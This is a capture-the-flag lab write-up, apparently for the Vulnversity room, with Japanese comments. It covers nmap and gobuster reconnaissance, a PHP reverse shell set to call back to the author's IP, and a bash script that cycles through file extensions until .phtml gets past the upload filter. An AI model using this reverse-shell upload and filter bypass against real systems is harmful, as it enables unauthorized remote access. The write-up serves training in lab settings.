# Reconnaissance

```sh
$ nmap -sV 10.10.182.55 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:47 EDT
Nmap scan report for 10.10.182.55
Host is up (0.075s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.21 seconds
```

# Scan the box; how many ports are open?

6

# What version of the squid proxy is running on the machine?

3.5.12

# How many ports will Nmap scan if the flag -p-400 was used?

```sh
$ nmap -sV 10.10.182.55 -p-400
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:51 EDT
Nmap scan report for 10.10.182.55
Host is up (0.031s latency).
Not shown: 397 closed tcp ports (conn-refused)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.95 seconds
```

400

# What is the most likely operating system this machine is running?

```sh
$ nmap -A 10.10.182.55        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:54 EDT
Nmap scan report for 10.10.182.55
Host is up (0.031s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2024-07-09T15:54:27-04:00
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-07-09T19:54:27
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 1h20m01s, deviation: 2h18m33s, median: 1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.33 seconds

$ sudo nmap -O 10.10.182.55    
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-09 15:59 EDT
Nmap scan report for 10.10.182.55
Host is up (0.032s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
Aggressive OS guesses: Linux 3.10 - 3.13 (96%), Linux 5.4 (96%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (93%), Sony Android TV (Android 5.0) (93%), Android 5.0 - 6.0.1 (Linux 3.4) (93%), Android 5.1 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 5.39 seconds
```

Ubuntu

# What port is the web server running on?

3333

# What is the flag for enabling verbose mode using Nmap?

-v

# What is the directory that has an upload form page?

```sh
$ gobuster dir --url http://10.10.182.55:3333 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.182.55:3333
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.182.55:3333/images/]
/css                  (Status: 301) [Size: 317] [--> http://10.10.182.55:3333/css/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.182.55:3333/js/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.182.55:3333/fonts/]
/internal             (Status: 301) [Size: 322] [--> http://10.10.182.55:3333/internal/]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

/internal/

# What common file type you'd want to upload to exploit the server is blocked? Try a couple to find out.

```sh
$ cp /usr/share/webshells/php/php-reverse-shell.php .
```

ペイロードを自分のホストに書き換える。

```php
$ip = '10.10.8.118';
$port = 1234;
```

httpieでリクエストを送信する

```sh
$ http --multipart POST http://10.10.117.137:3333/internal/ file@'./php-reverse-shell.php' 
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 336
Content-Type: text/html; charset=UTF-8
Date: Fri, 02 Aug 2024 20:42:20 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<style>
html, body {
    height: 30%;
}
html {
    display: table;
    margin: auto;
}
body {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
</style>
</head>
<body>
<form action="index.php" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
</form>
Extension not allowed</body>
</html>
```

攻撃用スクリプトを作成

```sh
#!/bin/bash

original_file="./php-reverse-shell.php"

while IFS= read -r ext; do
  temp_file="./php-reverse-shell$ext"
  
  cp "$original_file" "$temp_file"
  
  response=$(http --ignore-stdin --multipart POST http://10.10.117.137:3333/internal/ file@"$temp_file")
  
  if echo "$response" | grep -q "Extension not allowed"; then
    echo "Extension $ext: Not allowed"
  else
    echo "Extension $ext: Allowed"
  fi
  
  if [ "$ext" != ".php" ]; then
    rm "$temp_file"
  fi
done < phpext.txt
```

スクリプトを実行。

```sh
$ ./script.sh                                        
cp: './php-reverse-shell.php' and './php-reverse-shell.php' are the same file
Extension .php: Not allowed
Extension .php3: Not allowed
Extension .php4: Not allowed
Extension .php5: Not allowed
Extension .phtml: Allowed
```

拡張子が`.phtml`のときAllowedらしい。

アップロードされたファイルがどこにあるか探す。

```sh
$ gobuster dir --url http://10.10.117.137:3333/internal/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.117.137:3333/internal/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 332] [--> http://10.10.117.137:3333/internal/uploads/]
/css                  (Status: 301) [Size: 328] [--> http://10.10.117.137:3333/internal/css/]
```

/uploads/に確認
